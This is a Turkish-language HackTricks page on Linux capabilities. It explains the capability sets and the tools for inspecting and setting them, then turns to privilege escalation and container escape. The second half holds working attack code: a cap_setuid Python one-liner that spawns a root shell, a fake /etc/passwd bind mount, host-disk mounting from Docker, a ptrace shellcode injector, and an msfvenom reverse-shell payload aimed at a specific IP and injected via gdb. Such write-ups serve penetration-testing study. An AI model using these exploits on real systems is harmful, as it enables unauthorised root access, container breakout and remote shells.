# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **İspanya**'daki en önemli siber güvenlik etkinliği ve **Avrupa**'daki en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux yetenekleri **root ayrıcalıklarını daha küçük, belirgin birimlere böler**, süreçlerin bir ayrıcalık alt kümesine sahip olmasına olanak tanır. Bu, tam root ayrıcalıklarını gereksiz yere vermeyerek riskleri en aza indirir.

### Problem:
- Normal kullanıcıların sınırlı izinleri vardır, bu da root erişimi gerektiren bir ağ soketi açma gibi görevleri etkiler.

### Yetenek Setleri:

1. **Inherited (CapInh)**:
- **Amaç**: Ebeveyn süreçten devredilen yetenekleri belirler.
- **Fonksiyon**: Yeni bir süreç oluşturulduğunda, bu setten ebeveyninden yetenekleri devralır. Süreç oluşturma sırasında belirli ayrıcalıkları korumak için kullanışlıdır.
- **Kısıtlamalar**: Bir süreç, ebeveyninin sahip olmadığı yetenekleri kazanamaz.

2. **Effective (CapEff)**:
- **Amaç**: Bir sürecin herhangi bir anda kullandığı gerçek yetenekleri temsil eder.
- **Fonksiyon**: Çeşitli işlemler için izin vermek üzere çekirdek tarafından kontrol edilen yetenekler setidir. Dosyalar için, bu set dosyanın izin verilen yeteneklerinin etkili sayılıp sayılmayacağını belirten bir bayrak olabilir.
- **Önemi**: Etkili set, anlık ayrıcalık kontrolleri için kritik öneme sahiptir ve bir sürecin kullanabileceği aktif yetenekler seti olarak işlev görür.

3. **Permitted (CapPrm)**:
- **Amaç**: Bir sürecin sahip olabileceği maksimum yetenek setini tanımlar.
- **Fonksiyon**: Bir süreç, izin verilen setten bir yeteneği etkili setine yükseltebilir, bu da ona o yeteneği kullanma yetkisi verir. Ayrıca, izin verilen setinden yetenekleri düşürebilir.
- **Sınır**: Bir sürecin sahip olabileceği yetenekler için üst sınır olarak işlev görür ve bir sürecin önceden tanımlanmış ayrıcalık kapsamını aşmadığından emin olur.

4. **Bounding (CapBnd)**:
- **Amaç**: Bir sürecin yaşam döngüsü boyunca edinebileceği yetenekler için bir tavan koyar.
- **Fonksiyon**: Bir süreç, miras alınabilir veya izin verilen setinde belirli bir yeteneğe sahip olsa bile, o yeteneği yalnızca bounding setinde de varsa edinebilir.
- **Kullanım durumu**: Bu set, bir sürecin ayrıcalık yükseltme potansiyelini kısıtlamak için özellikle kullanışlıdır ve ek bir güvenlik katmanı ekler.

5. **Ambient (CapAmb)**:
- **Amaç**: Belirli yeteneklerin, tipik olarak sürecin yeteneklerinin tamamen sıfırlanmasına neden olacak bir `execve` sistem çağrısı sırasında korunmasına olanak tanır.
- **Fonksiyon**: İlgili dosya yeteneklerine sahip olmayan SUID olmayan programların belirli ayrıcalıkları korumasını sağlar.
- **Kısıtlamalar**: Bu set içindeki yetenekler, miras alınabilir ve izin verilen setlerin kısıtlamalarına tabidir, böylece sürecin izin verilen ayrıcalıklarını aşmazlar.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Daha fazla bilgi için kontrol edin:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Süreçler & İkili Dosyalar Yetenekleri

### Süreçler Yetenekleri

Belirli bir süreç için yetenekleri görmek için, /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığı için, bunu yalnızca Linux yetenekleri ile ilgili bilgilere sınırlayalım.\
Tüm çalışan süreçler için yetenek bilgisi her bir iş parçacığı başına korunur, dosya sistemindeki ikili dosyalar için ise genişletilmiş niteliklerde saklanır.

Yetenekleri /usr/include/linux/capability.h dosyasında bulabilirsiniz.

Mevcut sürecin yeteneklerini `cat /proc/self/status` komutunu kullanarak veya `capsh --print` komutunu çalıştırarak, diğer kullanıcıların yeteneklerini ise `/proc/<pid>/status` dosyasında bulabilirsiniz.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Bu komut, çoğu sistemde 5 satır döndürmelidir.

* CapInh = Miras alınan yetenekler
* CapPrm = İzin verilen yetenekler
* CapEff = Etkili yetenekler
* CapBnd = Sınır seti
* CapAmb = Ortam yetenekleri seti
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Bu onaltılık sayılar mantıklı değil. capsh aracını kullanarak bunları yetenek adlarına çözebiliriz.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Şimdi `ping` tarafından kullanılan **capabilities**'leri kontrol edelim:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID (PID). You can also provide a list of process IDs.

Bunun işe yaradığını bilsek de, başka ve daha kolay bir yol var. Çalışan bir sürecin yeteneklerini görmek için, **getpcaps** aracını kullanarak ardından süreç kimliğini (PID) yazmanız yeterlidir. Ayrıca bir süreç kimliği listesi de verebilirsiniz.
```bash
getpcaps 1234
```
Burada `tcpdump`'ın yeteneklerini kontrol edelim, ikili dosyaya yeterli yetenekler (`cap_net_admin` ve `cap_net_raw`) verildikten sonra ağı dinlemek için (_tcpdump işlem 9562'de çalışıyor_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Görüldüğü gibi, verilen yetenekler, bir ikili dosyanın yeteneklerini elde etmenin 2 yolunun sonuçlarıyla örtüşmektedir.\
_getpcaps_ aracı, belirli bir iş parçacığı için mevcut yetenekleri sorgulamak üzere **capget()** sistem çağrısını kullanır. Bu sistem çağrısı, daha fazla bilgi almak için yalnızca PID sağlamayı gerektirir.

### İkili Dosyaların Yetenekleri

İkili dosyalar, yürütme sırasında kullanılabilecek yeteneklere sahip olabilir. Örneğin, `cap_net_raw` yeteneğine sahip `ping` ikili dosyasını bulmak oldukça yaygındır:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Becerilere sahip **ikili dosyaları aramak için**:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Eğer _ping_ için CAP\_NET\_RAW yetkilerini düşürürsek, ping aracı artık çalışmamalıdır.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Bunun yanı sıra, _capsh_ çıktısının yanı sıra, _tcpdump_ komutu da bir hata vermelidir.

> /bin/bash: /usr/sbin/tcpdump: İşlem izin verilmedi

Hata, ping komutunun bir ICMP soketi açmasına izin verilmediğini açıkça gösteriyor. Artık bunun beklendiği gibi çalıştığını kesin olarak biliyoruz.

### Yetenekleri Kaldırma

Bir ikili dosyanın yeteneklerini kaldırabilirsiniz.
```bash
setcap -r </path/to/binary>
```
## Kullanıcı Yetenekleri

Görünüşe göre **yetenekler kullanıcılarla da atanabilir**. Bu muhtemelen, kullanıcının yürüttüğü her sürecin kullanıcı yeteneklerini kullanabileceği anlamına geliyor.\
[Bu](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [bu](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) ve [bu](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) temelinde, bir kullanıcıya belirli yetenekler vermek için yapılandırılması gereken birkaç dosya var, ancak yetenekleri her kullanıcıya atayan dosya `/etc/security/capability.conf` olacaktır.\
Dosya örneği:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Çevre Yetenekleri

Aşağıdaki programı derleyerek **yetenekler sağlayan bir ortamda bir bash shell başlatmak** mümkündür.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**Derlenmiş ortam ikili dosyası tarafından yürütülen bash içinde, "mevcut" bölümünde herhangi bir yeteneği olmayan bir normal kullanıcının aksine, **yeni yeteneklerin** gözlemlenmesi mümkündür.**
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Sadece **hem izin verilen hem de miras alınan setlerde bulunan** yetenekleri ekleyebilirsiniz.
{% endhint %}

### Yetenek farkında/Yetenek cahil ikili dosyalar

**Yetenek farkında ikili dosyalar**, ortam tarafından verilen yeni yetenekleri **kullanmayacak**, ancak **yetenek cahil ikili dosyalar** bunları **kullanacak** çünkü reddetmeyeceklerdir. Bu, yetenek cahil ikili dosyaları, ikili dosyalara yetenek veren özel bir ortamda savunmasız hale getirir.

## Hizmet Yetenekleri

Varsayılan olarak, **root olarak çalışan bir hizmet tüm yetenekleri atayacaktır** ve bazı durumlarda bu tehlikeli olabilir.\
Bu nedenle, bir **hizmet yapılandırma** dosyası, hizmetin sahip olmasını istediğiniz **yetenekleri** **belirlemenize** ve hizmeti çalıştıracak **kullanıcıyı** tanımlamanıza olanak tanır; böylece gereksiz ayrıcalıklara sahip bir hizmet çalıştırmaktan kaçınılır:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Konteynerlerinde Yetenekler

Varsayılan olarak Docker, konteynerlere birkaç yetenek atar. Bu yeteneklerin hangileri olduğunu kontrol etmek çok kolaydır:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **İspanya'daki** en önemli siber güvenlik etkinliği ve **Avrupa'daki** en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Konteyner Kaçışı

Yetkiler, **ayrıcalıklı işlemler gerçekleştirdikten sonra kendi süreçlerinizi kısıtlamak istediğinizde** (örneğin, chroot kurduktan ve bir sokete bağlandıktan sonra) faydalıdır. Ancak, kötü niyetli komutlar veya argümanlar geçirerek istismar edilebilir ve bu komutlar root olarak çalıştırılır.

`setcap` kullanarak programlara yetki zorlayabilir ve bunları `getcap` ile sorgulayabilirsiniz:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` demek, yeteneği ekliyorsunuz (“-” onu kaldırır) Etkili ve İzinli olarak.

Bir sistemde veya klasörde yeteneklere sahip programları tanımlamak için:
```bash
getcap -r / 2>/dev/null
```
### Sömürü örneği

Aşağıdaki örnekte, ikili dosya `/usr/bin/python2.6` privesc için savunmasız bulunmuştur:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Herhangi bir kullanıcının paketleri dinlemesine izin vermek için `tcpdump` tarafından gereken **Yetenekler**:**
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "Boş" yeteneklerin özel durumu

[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek setlerinin bir program dosyasına atanabileceğini unutmayın, bu nedenle, programı yürüten sürecin etkili ve kaydedilmiş set-kullanıcı-ID'sini 0 olarak değiştiren bir set-kullanıcı-ID-root programı oluşturmak mümkündür, ancak bu sürece hiçbir yetenek kazandırmaz. Ya da basitçe ifade etmek gerekirse, eğer bir ikili dosyanız varsa:

1. root tarafından sahiplenilmemiş
2. `SUID`/`SGID` bitleri ayarlanmamış
3. boş yetenek setine sahip (örneğin: `getcap myelf` `myelf =ep` döner)

o zaman **o ikili dosya root olarak çalışacaktır**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, geniş **yönetim ayrıcalıkları** nedeniyle genellikle neredeyse root seviyesine eşitlenen son derece güçlü bir Linux yeteneğidir; örneğin, cihazları monte etme veya çekirdek özelliklerini manipüle etme gibi. Tüm sistemleri simüle eden konteynerler için vazgeçilmez olsa da, **`CAP_SYS_ADMIN` önemli güvenlik zorlukları** ortaya çıkarır, özellikle ayrıcalık yükseltme ve sistemin tehlikeye atılma potansiyeli nedeniyle konteynerleştirilmiş ortamlarda. Bu nedenle, kullanımı sıkı güvenlik değerlendirmeleri ve dikkatli yönetim gerektirir; uygulama özel konteynerlerde bu yeteneğin bırakılması, **en az ayrıcalık ilkesi** ile uyum sağlamak ve saldırı yüzeyini en aza indirmek için güçlü bir tercih olmalıdır.

**İkili dosya ile örnek**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python kullanarak gerçek _passwd_ dosyasının üzerine değiştirilmiş bir _passwd_ dosyası monte edebilirsiniz:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Ve sonunda **mount** edilmiş `passwd` dosyasını `/etc/passwd` üzerine yerleştirin:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Ve "password" şifresi ile **`su` olarak root** olabileceksiniz.

**Ortam ile örnek (Docker breakout)**

Docker konteyneri içinde etkinleştirilen yetenekleri kontrol edebilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
İlk çıktıda SYS\_ADMIN yetkisinin etkin olduğunu görebilirsiniz.

* **Mount**

Bu, docker konteynerinin **ana makine diskini bağlamasına ve buna serbestçe erişmesine** olanak tanır:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Tam erişim**

Önceki yöntemde docker ana bilgisayar diskine erişmeyi başardık.\
Eğer ana bilgisayarın bir **ssh** sunucusu çalıştığını bulursanız, **docker ana bilgisayar** diskinde bir kullanıcı oluşturabilir ve buna SSH üzerinden erişebilirsiniz:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Bu, bir shellcode'u ana makinede çalışan bir süreç içine enjekte ederek konteynerden çıkabileceğiniz anlamına gelir.** Ana makinede çalışan süreçlere erişmek için konteynerin en az **`--pid=host`** ile çalıştırılması gerekir.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını kullanma yeteneğini verir. Hata ayıklama ve izleme amaçları için güçlü olmasına rağmen, `CAP_SYS_PTRACE` kısıtlayıcı önlemler olmadan, örneğin `ptrace(2)` üzerinde bir seccomp filtresi olmadan etkinleştirildiğinde, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, diğer güvenlik kısıtlamalarını, özellikle seccomp tarafından dayatılanları aşmak için kullanılabilir; bu, [bu tür kanıtlar (PoC) ile gösterilmiştir](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Binary ile örnek (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Örnek ile ikili (gdb)**

`gdb` ile `ptrace` yetkisi:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
msfvenom ile bellek içine enjekte etmek için bir shellcode oluşturun
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug bir root sürecini gdb ile yapın ve daha önce oluşturulan gdb satırlarını kopyalayıp yapıştırın:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Örnek ile ortam (Docker breakout) - Başka bir gdb Suistimali**

Eğer **GDB** yüklüyse (veya örneğin `apk add gdb` veya `apt install gdb` ile yükleyebilirsiniz) **bir süreci ana makineden hata ayıklayabilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yeteneğini de gerektirir)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
